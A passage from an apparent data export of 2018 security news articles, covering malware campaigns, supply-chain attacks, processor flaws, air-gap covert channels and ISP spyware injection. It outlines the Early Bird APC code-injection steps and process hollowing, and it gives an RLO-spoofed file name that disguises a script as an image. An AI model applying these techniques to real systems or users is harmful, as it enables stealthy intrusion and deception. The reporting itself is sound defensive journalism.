\"propagated through the power lines\" to covertly exfiltrate highly sensitive data out of an air gapped-computer." }

Dubbed \"Orangeworm,\" the hacking group has been found installing a wormable trojan on machines hosting software used for controlling high-tech imaging devices, such as X-Ray and MRI machines, as well as machines used to assist patients in completing consent forms. According to a new report published by Symantec on Monday, the Orangeworm hacking group has been active since early 2015 and targeting systems of major international corporations based in the United States, Europe, and Asia with a primary focus on the healthcare sector. \"We believe that these industries have also been targeted as part of a larger supply-chain attack in order for Orangeworm to get access to their intended victims related to healthcare,\" Symantec said. After getting into the victim's network, attackers install a trojan, dubbed Kwampirs, which opens a backdoor on the compromised computers, allowing attackers to remotely access equipment and steal sensitive data. While decrypting, the Kwampirs malware inserts a randomly generated string into its main DLL payload in an attempt to evade hash-based detection. The malware also starts a service on the compromised systems to persist and restart after the system reboots. Kwampirs then collects some basic information about the compromised computers and send it to the attackers to a remote command-and-control server, using which the group determines whether the hacked system is used by a researcher or a high-value target. If the victim is of interest, the malware then \"aggressively\" spread itself across open network shares to infect other computers within the same organisation. To gather additional information about the victim's network and compromised systems, the malware uses system's built-in commands, instead of using third-party reconnaissance and enumeration tools. Above shown list of commands help attackers to steal information including, \"any information pertaining to recently accessed computers, network adapter information, available network shares, mapped drives, and files present on the compromised computer.\" Besides health-care providers and pharmaceutical companies that account for nearly 40% of targets, Orangeworm has also launched attacks against other industries including information technology and manufacturing sectors, agriculture, and logistics. However, these industries also somehow work for healthcare, like manufacturers that make medical devices, technology companies that offer services to clinics, and logistics firms that deliver healthcare products. Although the exact motive of Orangeworm is not clear and there's no information that could help determine the group's origins, Symantec believes the group is likely conducting espionage for commercial purposes and there's no evidence that it's backed by a nation-state. \"Based on the list of known victims, Orangeworm does not select its targets randomly or conduct opportunistic hacking,\" Symantec said. \"Rather, the group appears to choose its targets carefully and deliberately, conducting a good amount of planning before launching an attack.\" The highest percentage of victims has been detected in the United States, followed by Saudi Arabia, India, Philippines, Hungary, United Kingdom, Turkey, Germany, Poland, Hong Kong, Sweden, Canada, France, and several other countries across the globe." }

Unfortunately, malicious browser extensions are nothing new. They often have access to everything you do online and could allow its creators to steal any information victims enter into any website they visit, including passwords, web browsing history and credit card details. Discovered by Andrey Meshkov, co-founder of Adguard, these five malicious extensions are copycat versions of some legitimate, well-known Ad Blockers. Creators of these extensions also used popular keywords in their names and descriptions to rank top in the search results, increasing the possibility of getting more users to download them. \"All the extensions I've highlighted are simple rip-offs with a few lines of code and some analytics code added by the authors,\" Meshkov says.

The malware attack infected over 2.3 million users who downloaded or updated their CCleaner app between August and September last year from the official website with the backdoored version of the software. Now, it turns out that the hackers managed to infiltrate the company's network almost five months before they first replaced the official CCleaner build with the backdoored version, revealed Avast executive VP and CTO Ondrej Vlcek at the RSA security conference in San Francisco on Tuesday. 6-Months Timeline of CCleaner Supply Chain Attack Vlcek shared a brief timeline of the last year's incident that came out to be the worst nightmare for the company, detailing how and when unknown hackers breached Piriform, the company that created CCleaner and was acquired by Avast in July 2017. March 11, 2017 (5 AM local time)—Attackers first accessed an unattended workstation of one of the CCleaner developers, which was connected to Piriform network, using remote support software TeamViewer. The company believes attackers reused the developer's credentials obtained from previous data breaches to access the TeamViewer account and managed to install malware using VBScript on the third attempt. March 12, 2017 (4 AM local time)—Using the first machine, attackers penetrated into the second unattended computer connected to the same network and opened a backdoor through Windows RDP (Remote Desktop Service) protocol. Using RDP access, the attackers dropped a binary and a malicious payload—a second stage malware (older version) that was later delivered to 40 CCleaner users—on the target computer's registry. March 14, 2017—Attackers infected the first computer with the older version of the second stage malware as well. April 4, 2017—Attackers compiled a customised version of ShadowPad, an infamous backdoor that allows attackers to download further malicious modules or steal data, and this payload the company believes was the third stage of the CCleaner attack. April 12, 2017—A few days later, attackers installed the 3rd stage payload on four computers in the Piriform network (as a mscoree.dll library) and a build server (as a .NET runtime library). Between mid-April and July—During this period, the attackers prepared the malicious version of CCleaner, and tried to infiltrate other computers in the internal network by installing a keylogger on already compromised systems to steal credentials, and logging in with administrative privileges through RDP. July 18, 2017—Security company Avast acquired Piriform, the UK-based software development company behind CCleaner with more than 2 billion downloads. August 2, 2017—Attackers replaced the original version of CCleaner software from its official website with their backdoored version of CCleaner, which was distributed to millions of users. September 13, 2017—Researchers at Cisco Talos detected the malicious version of the software, which was being distributed through the company's official website for more than a month, and notified Avast immediately. The malicious version of CCleaner had a multi-stage malware payload designed to steal data from infected computers and send it back to an attacker-controlled command-and-control server. Although Avast, with the help of the FBI, was able to shut down the attackers' command-and-control server within three days of being notified of the incident, the malicious CCleaner software had already been downloaded by 2.27 million users. Moreover, it was found that the attackers were then able to install a second-stage payload on 40 selected computers operated by major international technology companies, including Google, Microsoft, Cisco, Intel, Samsung, Sony, HTC, Linksys, D-Link, Akamai and VMware. However, the company has no proofs if the third stage payload with ShadowPad was distributed to any of these targets. \"Our investigation revealed that ShadowPad had been previously used in South Korea, and in Russia, where attackers intruded a computer, observing a money transfer.\" Avast said. \"The oldest malicious executable used in the Russian attack was built in 2014, which means the group behind it might have been spying for years.\" Based on their analysis of the ShadowPad executable from the Piriform network, Avast believes that the malicious attackers behind the malware have been active for a long time, spying on institutions and organizations so thoroughly." }

In order to trick victims into installing the Android malware, dubbed Roaming Mantis, hackers have been hijacking DNS settings on vulnerable and poorly secured routers. DNS hijacking attack allows hackers to intercept traffic, inject rogue ads on web-pages and redirect users to phishing pages designed to trick them into sharing their sensitive information like login credentials, bank account details, and more. Hijacking routers' DNS for a malicious purpose is not new. Previously we reported about widespread DNSChanger and Switcher—both the malware worked by changing the DNS settings of the wireless routers to redirect traffic to malicious websites controlled by attackers. Discovered by security researchers at Kaspersky Lab, the new malware campaign has primarily been targeting users in Asian countries, including South Korea, China Bangladesh, and Japan, since February this year. Once modified, the rogue DNS settings configured by hackers redirect victims to fake versions of legitimate websites they try to visit and displays a pop-up warning message, which says—\"To better experience the browsing, update to the latest chrome version.\" It then downloads the Roaming Mantis malware app masquerading as Chrome browser app for Android, which takes permission to collect device’ account information, manage SMS/MMS and making calls, record audio, control external storage, check packages, work with file systems, draw overlay windows and so on. \"The redirection led to the installation of Trojanized applications named facebook.apk and chrome.apk that contained Android Trojan-Banker.\" If installed, the malicious app overlays all other windows immediately to show a fake warning message (in broken English), which reads, \"Account No.exists risks, use after certification.\" Roaming Mantis then starts a local web server on the device and launches the web browser to open a fake version of Google website, asking users to fill up their names and date of births. To convince users into believing that they are handing over this information to Google itself, the fake page displays users' Gmail email ID configured on their infected Android device, as shown in the screenshots. \"After the user enters their name and date of birth, the browser is redirected to a blank page at http://127.0.0.1:${random_port}/submit,\" researchers said. \"Just like the distribution page, the malware supports four locales: Korean, Traditional Chinese, Japanese and English.\" Since Roaming Mantis malware app has already gained permission to read and write SMS on the device, it allows attackers to steal the secret verification code for the two-factor authentication for victims' accounts. While analysing the malware code, Researchers found reference to popular South Korean mobile banking and gaming applications, as well as a function that tries to detect if the infected device is rooted. \"For attackers, this may indicate that a device is owned by an advanced Android user (a signal to stop messing with the device) or, alternatively, a chance to leverage root access to gain access to the whole system,\" the researchers said. What's interesting about this malware is that it uses one of the leading Chinese social media websites (my.tv.sohu.com) as its command-and-control server and sends commands to infected devices just via updating the attacker-controlled user profiles. According to Kaspersky's Telemetry data, the Roaming Mantis malware was detected more than 6,000 times, though the reports came from just 150 unique users. You are advised to ensure your router is running the latest version of the firmware and protected with a strong password. You should also disable router's remote administration feature and hardcode a trusted DNS server into the operating system network settings." }

As its name suggests, Early Bird is a \"simple yet powerful\" technique that allows attackers to inject malicious code into a legitimate process before its main thread starts, and thereby avoids detection by Windows hook engines used by most anti-malware products. The Early Bird code injection technique \"loads the malicious code in a very early stage of thread initialization, before many security products place their hooks—which allows the malware to perform its malicious actions without being detected,\" the researchers said. The technique is similar to the AtomBombing code injection technique that does not rely on easy-to-detect API calls, allowing malware to inject code into processes in a manner that no anti-malware tools can detect. How Early Bird Code Injection Works Early Bird code injection method relies on a Windows built-in APC (Asynchronous Procedure Calls) function that allows applications to execute code asynchronously in the context of a particular thread. Here's a brief step-by-step explanation of how an attacker can inject malicious code into a legitimate process in a way that it gets executed earlier before an anti-malware program starts scanning. Create a suspended process of a legitimate Windows process (e.g., svchost.exe) Allocate memory in that process (svchost.exe) and write the malicious code into the allocated memory region, Queue an asynchronous procedure call (APC) to the main thread of that process (svchost.exe), Since APC can execute a process only when it is in an alertable state, call NtTestAlert function to force kernel into executing the malicious code as soon as the main thread resumes. According to the researchers, at least three following-mentioned malware were found using Early Bird code injection in the wild. \"TurnedUp\" backdoor, developed by an Iranian hacking group (APT33) A variant of \"Carberp\" banking malware \"DorkBot\" malware Initially discovered by FireEye in September 2017, TurnedUp is a backdoor that is capable of exfiltrating data from the target system, creating reverse shells, taking screenshots as well as gathering system information. Dates back to 2012, DorBot is botnet malware distributed via links on social media, instant messaging apps or infected removable media and is used to steal users' credentials for online services, including banking services, participate in distributed denial-of-service (DDoS) attacks, send spam and deliver other malware to victims' computers. Researchers have also provided a video demonstration, which shows the new Early Bird code injection technique in action." }

Last year, we saw some major ransomware outbreaks, including WannaCry and NotPetya, which wreaked havoc across the world, hitting hundreds of thousands of computers and business networks worldwide. From small to mid-range businesses, Microsoft Office 365 remains the most widely used and fastest-growing work office suite, so it's no surprise that it has become a primary target for viruses, ransomware, and phishing scams. In fact, most strains of ransomware target Microsoft productivity apps such as Word, Excel and encrypt sensitive data to hold the company hostage until the ransom is paid. Now, to combat such cyber attacks, Microsoft has announced some new security features for Office 365 that can help users mitigate the damage done by ransomware and other malware infections. The new features were initially introduced for OneDrive for Business, but that the company is now rolling them out to anyone who has signed up for an Office 365 Home or Personal subscription, Microsoft Office blog says. Here below I have briefed the list of new features: File Recovery and Anti-Ransomware Files Restore—Microsoft Office 365 now allows users to restore entire OneDrive to a previous point in time within the last 30 days. This feature can be used to recover files from an accidental mass delete, file corruption, ransomware, or any catastrophic event. Ransomware detection & recovery—Office 365 had also introduced a new security feature that detects ransomware attacks and alerts you through an email, mobile, or desktop notification while helping you restore your OneDrive to a point before the malware compromised files. Security and Privacy Features Office 365 has added three new features to help keep your confidential or personal data (such as tax documents, family budgets, or a new business proposal) secure and private when sharing them online. Password protected sharing links—This feature allows you to set a password for your shared file and folders, preventing unauthorized access even if your recipient accidentally forwards protected documents to others. Email encryption—This feature allows users to send/receive end-to-end encrypted emails in Outlook over a secure connection, providing additional protection to minimize the threat of being intercepted. Prevent forwarding—Microsoft now enables you to restrict your email recipients from forwarding or copying emails you send to them from Outlook. Besides this, any MS Office document attached to your emails will remain encrypted even after downloading, so if the recipient shares your attachment with others, they will not be able to open it. Advanced Protection from Viruses and Cybercrime Advanced link checking in Word, Excel, and PowerPoint—Office 365 also offers built-in real-time web protection, which monitors every link you click in Word, Excel, and PowerPoint and notifies you if it is suspicious. File Recovery and Anti-Ransomware features began rolling out starting today and will be available to all Office 365 users soon, while features to help keep your information secure and private (including password protected sharing links, email encryption, and prevent forwarding) will start rolling out in the coming weeks. Advanced link checking and advanced attachment scanning are already available in MS Outlook that protects you from previously unseen viruses and phishing scams in real-time. However, advanced link checking in Word, Excel, and PowerPoint will roll out in the second half of 2018." }

Talos researchers published Monday technical details about two recent variants of KevDroid detected in the wild, following the initial discovery of the Trojan by South Korean cybersecurity firm ESTsecurity two weeks ago. Though researchers haven't attributed the malware to any hacking or state-sponsored group, South Korean media have linked KevDroid with North Korea state-sponsored cyber espionage hacking group \"Group 123,\" primarily known for targeting South Korean targets. The most recent variant of KevDroid malware, detected in March this year, has the following capabilities: record phone calls & audio steal web history and files gain root access steal call logs, SMS, emails collect device' location at every 10 seconds collect a list of installed applications Malware uses an open source library, available on GitHub, to gain the ability to record incoming and outgoing calls from the compromised Android device. Although both malware samples have the same capabilities of stealing information on the compromised device and recording the victim's phone calls, one of the variants even exploits a known Android flaw (CVE-2015-3636) to get root access on the compromised device. All stolen data is then sent to an attacker-controlled command and control (C2) server, hosted on PubNub global Data Stream Network, using an HTTP POST request. \"If an adversary were successful in obtaining some of the information KevDroid is capable of collecting, it could result in a multitude of issues for the victim,\" resulting in \"the leakage of data, which could lead to a number of things, such as the kidnapping of a loved one, blackmail by using images or information deemed secret, credential harvesting, multi-factor token access (SMS MFA), banking/financial implications and access to privileged information, perhaps via emails/texts,\" Talos says. \"Many users access their corporate email via mobile devices. This could result in cyber espionage being a potential outcome for KevDroid.\" Researchers also discovered another RAT, designed to target Windows users, sharing the same C&C server and also uses PubNub API to send commands to the compromised devices. How to Keep Your Smartphone Secure Android users are advised to regularly cross-check apps installed on their devices to find and remove if any malicious/unknown/unnecessary app is there in the list without your knowledge or consent. Such Android malware can be used to target your devices as well, so you if own an Android device, you are strongly recommended to follow these simple steps to help avoid this happening to you: Never install applications from 3rd-party stores. Ensure that you have already opted for Google Play Protect. Enable 'verify apps' feature from settings. Keep \"unknown sources\" disabled while not using it. Install anti-virus and security software from a well-known cybersecurity vendor. Regularly back up your phone. Always use an encryption application for protecting any sensitive information on your phone. Never open documents that you are not expecting, even if it looks like it's from someone you know. Protect your devices with pin or password lock so that nobody can gain unauthorized access to your device when remains unattended. Keep your device always up-to-date with the latest security patches." }

Dubbed Dofoil (also known as Smoke Loader), the malware was found dropping a cryptocurrency miner program as payload on infected Windows computers that mine Electroneum digital coins for attackers using victims' CPU cycles. Dofoil campaign that hit PCs in Russia, Turkey, and Ukraine on 6th March was discovered by Microsoft Windows Defender research department and blocked the attack before it could have done any severe damages. At the time when Windows Defender researchers detected this attack, they did not mention how the malware was delivered to such a massive audience in just 12 hours. However, after investigation Microsoft today revealed that the attackers targeted the update mechanism of MediaGet BitTorrent software to push its trojanized version (mediaget.exe) to users' computers. \"A signed mediaget.exe downloads an update.exe program and runs it on the machine to install a new mediaget.exe. The new mediaget.exe program has the same functionality as the original but with additional backdoor capability,\" the researchers explain in a blog post published today. Researchers believe MediaGet that signed update.exe is likely to be a victim of the supply chain attack, similar to CCleaner hack that infected over 2.3 million users with the backdoored version of the software in September 2017. Also, in this case, the attackers signed the poisoned update.exe with a different certificate and successfully passed the validation required by the legitimate MediaGet. \"The dropped update.exe is a packaged InnoSetup SFX which has an embedded trojanized mediaget.exe, update.exe. When run, it drops a trojanized unsigned version of mediaget.exe.\" Once updated, the malicious BitTorrent software with additional backdoor functionality randomly connects to one (out of four) of its command-and-control (C&C) servers hosted on decentralized Namecoin network infrastructure and listens for new commands. It then immediately downloads CoinMiner component from its C&C server, and start using victims' computers mine cryptocurrencies for the attackers. Using C&C servers, attackers can also command infected systems to download and install additional malware from a remote URL. The researchers found that the trojanized BitTorrent client, detected by Windows Defender AV as Trojan:Win32/Modimer.A, has 98% similarity to the original MediaGet binary. Microsoft says behavior monitoring and AI-based machine learning techniques used by its Windows Defender Antivirus software have played an important role to detect and block this massive malware campaign." }
{ "_id" : { "$oid" : "5b35bcc16cefc42b00293487" }, "Category" : "Malware", "Title" : "13 Critical Flaws Discovered in AMD Ryzen and EPYC Processors", "Address" : "https://thehackernews.com/2018/03/amd-processor-vulnerabilities.html", "Date" : "2018-03-13T05:37:00-11:00", "Article" : "Security researchers claimed to have discovered 13 critical Spectre/Meltdown-like vulnerabilities throughout AMD's Ryzen and EPYC lines of processors that could allow attackers to access sensitive data, install persistent malware inside the chip, and gain full access to the compromised systems. All these vulnerabilities reside in the secure part of the AMD's Zen architecture processors and chipsets—typically where device stores sensitive information such as passwords and encryption keys and makes sure nothing malicious is running when you start your PC. The alleged vulnerabilities are categorized into four classes—RYZENFALL, FALLOUT, CHIMERA, and MASTERKEY—and threaten wide-range of servers, workstations, and laptops running vulnerable AMD Ryzen, Ryzen Pro, Ryzen Mobile or EPYC processors. Discovered by a team of researchers at Israel-based CTS-Labs, newly disclosed unpatched vulnerabilities defeat AMD's Secure Encrypted Virtualization (SEV) technology and could allow attackers to bypass Microsoft Windows Credential Guard to steal network credentials. Moreover, researchers also claimed to have found two exploitable manufacturer backdoors inside Ryzen chipset that could allow attackers to inject malicious code inside the chip. Researchers successfully tested these vulnerabilities against 21 different AMD products and believe that 11 more products are also vulnerable to the issues. Though AMD is currently investigating the accuracy of these flaws, Dan Guido, the founder of security firm Trail of Bits, who got early access to the full technical details and PoC exploits, have independently confirmed that all 13 AMD flaws are accurate and works as described in the paper. Here's the brief explanation of all the vulnerabilities: RYZENFALL (v1, v2, v3, v4) AMD Vulnerabilities These flaws reside in AMD Secure OS and affect Ryzen secure processors (workstation/pro/mobile). According to researchers, RYZENFALL vulnerabilities allow unauthorized code execution on the Ryzen Secure Processor, eventually letting attackers access protected memory regions, inject malware into the processor itself, and disable SMM protections against unauthorized BIOS reflashing. Attackers could also use RYZENFALL to bypass Windows Credential Guard and steal network credentials, and then use the stolen data to spread across to other computers within that network (even highly secure Windows corporate networks). RYZENFALL can also be combined with another issue called MASTERKEY (detailed below) to install persistent malware on the Secure Processor, \"exposing customers to the risk of covert and long-term industrial espionage.\" FALLOUT (v1, v2, v3) AMD Vulnerabilities These vulnerabilities reside in the bootloader component of EPYC secure processor and allow attackers to read from and write to protected memory areas, such as SMRAM and Windows Credential Guard isolated memory. FALLOUT attacks only affect servers using AMD's EPYC secure processors and could be exploited to inject persistent malware into VTL1, where the Secure Kernel and Isolated User Mode (IUM) execute code. Like RYZENFALL, FALLOUT also let attackers bypass BIOS flashing protections, and steal network credentials protected by Windows Credential Guard. \"EPYC servers are in the process of being integrated into data centers around the world, including at Baidu and Microsoft Azure Cloud, and AMD has recently announced that EPYC and Ryzen embedded processors are being sold as high-security solutions for mission-critical aerospace and defense systems,\" researchers say. \"We urge the security community to study the security of these devices in depth before allowing them on mission-critical systems that could potentially put lives at risk.\" CHIMERA (v1, v2) AMD Vulnerabilities These two vulnerabilities are actually hidden manufacturer backdoors inside AMD's Promontory chipsets that are an integral part of all Ryzen and Ryzen Pro workstations. One backdoor has been implemented in firmware running on the chip, while the other in the chip's hardware (ASIC), and allow attackers to run arbitrary code inside the AMD Ryzen chipset, or to re-flash the chip with persistent malware. Since WiFi, network and Bluetooth traffic flows through the chipset, an attacker could exploit the chipset's man-in-the-middle position to launch sophisticated attacks against your device. \"This, in turn, could allow for firmware-based malware that has full control over the system, yet is notoriously difficult to detect or remove. Such malware could manipulate the operating system through Direct Memory Access (DMA), while remaining resilient against most endpoint security products,\" researchers say. According to the researchers, it may be possible to implement a stealthy keylogger by listening to USB traffic that flows through the chipset, allowing attackers to see everything a victim types on the infected computer. \"Because the latter has been manufactured into the chip, a direct fix may not be possible, and the solution may involve either a workaround or a recall,\" researchers warn. MASTERKEY (v1, v2, v3) AMD Vulnerabilities These three vulnerabilities in EPYC and Ryzen (workstation/pro/mobile) processors could allow attackers to bypass hardware validated boot to re-flash BIOS with a malicious update and infiltrate the Secure Processor to achieve arbitrary code execution. Like RYZENFALL and FALLOUT, MASTERKEY also allows attackers to install stealthy and persistent malware inside AMD Secure Processor, \"running in kernel-mode with the highest possible permissions,\" as well as bypass Windows Credential Guard to facilitate network credential theft. MASTERKEY vulnerabilities also allow attackers to disable security features such as Firmware Trusted Platform Module (fTPM) and Secure Encrypted Virtualization (SEV). It's notable that all these vulnerabilities require either low-privilege access, or administrative in some cases, on the targeted system to work. CTS-Lab researchers gave just 24 hours to the AMD team to look at all vulnerabilities and respond before going public with their details—that's hell quick for any company to understand and patch the critical level issues properly. While Intel and Microsoft are still managing its patches for Meltdown and Spectre vulnerabilities, the newly discovered vulnerabilities could create similar trouble for AMD and its customers. So, let's wait and watch when the company comes up with fixes, though the researchers said it could take \"several months to fix\" all the issues. For more detailed information about the vulnerabilities, you can head on to this paper [PDF] titled, \"Severe Security Advisory on AMD Processors,\" published by CTS-Lab." }

Air-gapped computers are believed to be the most secure setup wherein the systems remain isolated from the Internet and local networks, requiring physical access to access data via a USB flash drive or other removable media. Dubbed MOSQUITO, the new technique, discovered by a team of researchers at Israel's Ben Gurion University, works by reversing connected speakers (passive speakers, headphones, or earphones) into microphones by exploiting a specific audio chip feature. Two years ago, the same team of researchers demonstrated how attackers could covertly listen to private conversations in your room just by reversing your headphones (connected to the infected computer) into a microphone, like a bug listening device, using malware. Now, with its latest research [PDF], the team has taken their work to the next level and found a way to convert some speakers/headphones/earphones that are not originally designed to perform as microphones into a listening device—when the standard microphone is not present, muted, taped, or turned off. Since some speakers/headphones/earphones respond well to the near-ultrasonic range (18kHz to 24kHz), researchers found that such hardware can be reversed to perform as microphones. Moreover, when it comes to a secret communication, it's obvious that two computers can't exchange data via audible sounds using speakers and headphones. So, inaudible ultrasonic waves offer the best acoustic covert channel for speaker-to-speaker communication. Video Demonstrations of MOSQUITO Attack Ben Gurion's Cybersecurity Research Center, directed by 38-year-old Mordechai Guri, used ultrasonic transmissions to make two air-gapped computers talk to each other despite the high degree of isolation. The attack scenarios demonstrated by researchers in the proof-of-concept videos involve two air-gap computers in the same room, which are somehow (using removable media) infected with malware but can not exchange data between them to accomplish attacker's mission. The attack scenarios include speaker-to-speaker communication, speaker-to-headphones communication, and headphones-to-headphones communication. \"Our results show that the speaker-to-speaker communication can be used to covertly transmit data between two air-gapped computers positioned a maximum of nine meters away from one another,\" the researchers say. \"Moreover, we show that two (microphone-less) headphones can exchange data from a distance of three meters apart.\" However, by using loudspeakers, researchers found that data can be exchanged over an air-gap computer from a distance of eight meters away with an effective bit rate of 10 to 166 bit per second. It's not the first time when Ben-Gurion researchers have come up with a covert technique to target air-gapped computers. Their previous research of hacking air-gap computers include: aIR-Jumper attack steals sensitive data from air-gapped PCs with the help of infrared-equipped CCTV cameras that are used for night vision. USBee can be used to steal data from air-gapped computers using radio frequency transmissions from USB connectors. DiskFiltration can steal data using sound signals emitted from the hard disk drive (HDD) of air-gapped computers. BitWhisper relies on heat exchange between two computers to stealthily siphon passwords and security keys. AirHopper turns a computer's video card into an FM transmitter to capture keystrokes. Fansmitter technique uses noise emitted by a computer fan to transmit data. GSMem attack relies on cellular frequencies." }

Governments, or agencies linked to it, and ISPs in the three countries are using Deep Packet Inspection technology from Sandvine (which merged with Procera Networks last year), to intercept and alter Internet users' web traffic. Deep packet inspection technology allows ISPs to prioritize, degrade, block, inject, and log various types of Internet traffic, in other words, they can analyze each packet in order to see what you are doing online. According to a new report by Citizen Lab, Turkey's Telecom network was using Sandvine PacketLogic devices to redirect hundreds of targeted users (journalists, lawyers, and human rights defenders) to malicious versions of legitimate programs bundled with FinFisher and StrongPity spyware, when they tried to download them from official sources. \"This redirection was possible because official websites for these programs, even though they might have supported HTTPS, directed users to non-HTTPS downloads by default,\" the report reads. A similar campaign has been spotted in Syria, where Internet users were silently redirected to malicious versions of the various popular application, including Avast Antivirus, CCleaner, Opera, and 7-Zip applications bundled with government spyware. In Turkey, Sandvine PacketLogic devices were being used to block websites like Wikipedia, the sites of the Dutch Broadcast Foundation (NOS) and Kurdistan Workers' Party (PKK). ISPs Injected Cryptocurrency Mining Scripts Into Users' Web Browsers However, in Egypt, Sandvine PacketLogic devices were being used by a Telecom operator for making money by: Secretly injecting a cryptocurrency mining script into every HTTP web page users visited in order to mine the Monero cryptocurrency, Redirecting Egyptian users to web pages with affiliate ads. In Egypt, these devices were also being used to block access to human rights, political, and news outlets like Al Jazeera, HuffPost Arabic, Reporters Without Borders, and Mada Masr, as well as NGOs like Human Rights Watch. Citizen Lab researchers reported Sandvine of their findings, but the company called their report \"false, misleading, and wrong,\" and also demanded them to return the second-hand PacketLogic device they used to confirm attribution of their fingerprint. Citizen Lab started this investigation in September last year after ESET researchers published a report revealing that the downloads of several popular apps were reportedly compromised at the ISP level in two (unnamed) countries to distribute the FinFisher spyware." }

According to the researchers, Dofoil trojan uses an old code injection technique called 'process hollowing' that that involves spawning a new instance of a legitimate process with a malicious one so that the second code runs instead of the original, tricking process monitoring tools and antivirus into believing that the original process is running. \"The hollowed explorer.exe process then spins up a second malicious instance, which drops and runs a coin mining malware masquerading as a legitimate Windows binary, wuauclt.exe.\" To stay persistence on an infected system for a long time to mine Electroneum coins using stolen computer resources, Dofoil trojan modifies the Windows registry. \"The hollowed explorer.exe process creates a copy of the original malware in the Roaming AppData folder and renames it to ditereah.exe,\" the researchers say. \"It then creates a registry key or modifies an existing one to point to the newly created malware copy. In the sample we analyzed, the malware modified the OneDrive Run key.\" Dofoil also connects to a remote command and control (C&C) server hosted on decentralized Namecoin network infrastructure and listens for new commands, including the installation of additional malware. Microsoft says behavior monitoring and Artificial intelligence based machine learning techniques used by Windows Defender Antivirus have played an important role to detect and block this massive malware campaign." }

Taylor Huddleston, 26, of Hot Springs, Arkansas, pleaded guilty in July 2017 to one charge of aiding and abetting computer intrusions by building and intentionally selling a remote access trojan (RAT), called NanoCore, to hackers for $25. Huddleston was arrested in March, almost two months before the FBI raided his house in Hot Springs, Arkansas and left with his computers after 90 minutes, only to return eight weeks later with handcuffs. This case is a rare example of the US Department of Justice (DOJ) charging someone not for actively using malware to hack victims' computers, but for developing and selling it to other cybercriminals. Huddleston admitted to the court that he created his software knowing it would be used by other cybercriminals to break the law. He initially started developing NanoCore in late 2012 with a motive to offer a low-budget remote management software for schools, IT-conscious businesses, and parents who desired to monitor their children's activities on the web. However, Huddleston marketed and sold the NanoCore RAT for $25 in underground hacking forums that were extremely popular with cybercriminals around the world from January 2014 to February 2016. He then sold ownership of NanoCore to a third-party in 2016. NanoCore RAT happens to be popular among cybercriminals on underground hacking forums and has been linked to intrusions in at least ten countries. Among the victims was a high-profile assault on Middle Eastern energy firms in 2015. Huddleston also agreed with prosecutors that NanoCore RAT and available third-party plugins offered a full set of features including: Stealing sensitive information from victim computers, such as passwords, emails, and instant messages. Remotely activating and controlling connected webcams on the victims' computers in order to spy on them. Ability to view, delete, and download files. Locking infected PCs and holding them to ransom. Using infected PCs to launch distributed denial of service (DDoS) attacks on websites and similar services. In July plea, Huddleston also took responsibility for creating and operating a software licensing system called \"Net Seal\" that was used by another suspect, Zachary Shames, to sell thousands of copies of Limitless keylogger. Shames used Net Seal to infect 3,000 people that were, in turn, used it to infect 16,000 computers, according to the DoJ. In his guilty plea, Huddleston admitted that he intended his products to be used maliciously. Besides the 33-month prison sentence handed down by judges on Friday, Huddleston also gets two years of supervised release." }

Google's security researcher at Project Zero discovered a serious remote code execution vulnerability in both the 'μTorrent desktop app for Windows' and newly launched 'μTorrent Web' that allows users to download and stream torrents directly into their web browser. μTorrent Classic and μTorrent Web apps run in the background on the Windows machine and start a locally hosted HTTP RPC server on ports 10000 and 19575, respectively, using which users can access its interfaces over any web browser. However, Project Zero researcher Tavis Ormandy found that several issues with these RPC servers could allow remote attackers to take control of the torrent download software with little user interaction. According to Ormandy, uTorrent apps are vulnerable to a hacking technique called the \"domain name system rebinding\" that could allow any malicious website a user visits to execute malicious code on user's computer remotely. To execute DNS rebinding attack, one can simply create a malicious website with a DNS name that resolves to the local IP address of the computer running a vulnerable uTorrent app. \"This requires some simple DNS rebinding to attack remotely, but once you have the secret you can just change the directory torrents are saved to, and then download any file anywhere writable,\" Ormandy explained. Proof-of-Concept Exploits for uTorrent Software Released Publicly Ormandy also provided proof-of-concept exploits for μTorrent Web and μTorrent desktop (1 and 2), which are capable of passing malicious commands through the domain in order to get them to execute on the targeted computer. Last month, Ormandy demonstrated same attack technique against the Transmission BitTorrent app. Ormandy reported BitTorrent of the issues with the uTorrent client in November 2017 with a 90-days disclosure deadline, but a patch was made public on Tuesday—that's almost 80 days after the initial disclosure. What's more? The re-issued new security patches the same day after Ormandy found that his exploits continued to work successfully in the default configuration with a small tweak. \"This issue is still exploitable,\" Ormandy said. \"The vulnerability is now public because a patch is available, and BitTorrent have already exhausted their 90 days anyway.\" \"I see no other option for affected users but to stop using uTorrent Web and contact BitTorrent and request a comprehensive patch.\" Patch your uTorrent Software NOW! The company assured its users that all vulnerabilities reported by Ormandy it two of its products had been addressed with the release of: μTorrent Stable 3.5.3.44358 BitTorrent Stable 7.10.3.44359 μTorrent Beta 3.5.3.44352 μTorrent Web 0.12.0.502 All users are urged to update their software immediately." }

The Telegram vulnerability was uncovered by security researcher Alexey Firsh from Kaspersky Lab last October and affects only the Windows client of Telegram messaging software. The flaw has actively been exploited in the wild since at least March 2017 by attackers who tricked victims into downloading malicious software onto their PCs that used their CPU power to mine cryptocurrencies or serve as a backdoor for attackers to remotely control the affected machine, according to a blogpost on Securelist. Here's How Telegram Vulnerability Works The vulnerability resides in the way Telegram Windows client handles the RLO (right-to-left override) Unicode character (U+202E), which is used for coding languages that are written from right to left, like Arabic or Hebrew. According to Kaspersky Lab, the malware creators used a hidden RLO Unicode character in the file name that reversed the order of the characters, thus renaming the file itself, and send it to Telegram users. For example, when an attacker sends a file named \"photo_high_re*U+202E*gnp.js\" in a message to a Telegram user, the file's name rendered on the users' screen flipping the last part. Therefore, the Telegram user will see an incoming PNG image file (as shown in the below image) instead of a JavaScript file, misleading into downloading malicious files disguised as the image. \"As a result, users downloaded hidden malware which was then installed on their computers,\" Kaspersky says in its press release published today. Kaspersky Lab reported the vulnerability to Telegram and the company has since patched the vulnerability in its products, as the Russian security firm said: \"at the time of publication, the zero-day flaw has not since been observed in messenger's products.\" Hackers Used Telegram to Infect PCs with Cryptocurrency Miners During the analysis, Kaspersky researchers found several scenarios of zero-day exploitation in the wild by threat actors. Primarily, the flaw was actively exploited to deliver cryptocurrency mining malware, which uses the victim's PC computing power to mine different types of cryptocurrency including Monero, Zcash, Fantomcoin, and others. While analyzing the servers of malicious actors, the researchers also found archives containing a Telegram's local cache that had been stolen from victims. In another case, cybercriminals successfully exploited the vulnerability to install a backdoor trojan that used the Telegram API as a command and control protocol, allowing hackers to gain remote access to the victim’s computer. \"After installation, it started to operate in a silent mode, which allowed the threat actor to remain unnoticed in the network and execute different commands including the further installation of spyware tools,\" the firm added. Firsh believes the zero-day vulnerability was exploited only by Russian 